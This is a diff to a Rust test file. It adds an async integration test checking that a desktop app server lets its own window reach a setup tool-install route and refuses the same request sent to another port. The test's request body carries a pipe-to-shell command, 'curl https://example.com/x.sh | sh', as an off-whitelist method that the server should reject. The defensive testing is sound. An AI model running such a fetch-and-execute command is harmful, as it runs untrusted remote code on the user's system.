@@ -589,6 +589,40 @@ async fn the_desktop_apps_own_account_opens_nothing_by_itself() {
     server.stop().await;
 }
 
+/// The desktop app's own window reaches the first-run guide's gated routes on
+/// the port this server listens on: the boot records the port its listener
+/// got, and the desktop-window gate reads it. An install naming a method off
+/// the whitelist gets past the gate to `400 unknown_method`; the same request
+/// addressed to another port is refused `403 app_only`.
+#[tokio::test]
+async fn the_desktop_apps_window_reaches_the_guide_on_the_port_the_server_listens_on() {
+    let home = tempfile::tempdir().expect("tempdir");
+    let secret = "correct horse battery";
+    accounts(home.path(), "droppen-app").add_app("droppen-app", secret).await.expect("app account");
+    let server = common::TestServer::start_desktop_app_at(home.path(), "droppen-app").await;
+    let authorization = format!("Bearer {}", login(&server, "droppen-app", secret).await);
+    let body = serde_json::to_vec(&json!({ "method": "curl https://example.com/x.sh | sh" })).expect("encode");
+    let install = |at: String| {
+        let (authorization, body, server) = (authorization.clone(), body.clone(), &server);
+        async move {
+            let origin = format!("http://{at}");
+            let headers = [
+                ("Content-Type", "application/json"),
+                ("Authorization", authorization.as_str()),
+                ("Host", at.as_str()),
+                ("Origin", origin.as_str()),
+            ];
+            let (status, answer) = server.request("POST", "/api/setup/tools/claude/install", &headers, &body).await;
+            (status, serde_json::from_str::<Value>(&answer).unwrap_or_default()["error"].clone())
+        }
+    };
+    let here = format!("127.0.0.1:{}", server.addr.port());
+    assert_eq!(install(here).await, (400, json!("unknown_method")), "the app's window is past the gate");
+    let elsewhere = format!("127.0.0.1:{}", server.addr.port().wrapping_add(1));
+    assert_eq!(install(elsewhere).await, (403, json!("app_only")), "another port is not the app's window");
+    server.stop().await;
+}
+
 /// An instance that already has accounts starts exactly as it always did: no
 /// setup state, no code, a login for every route — this device included.
 #[tokio::test]
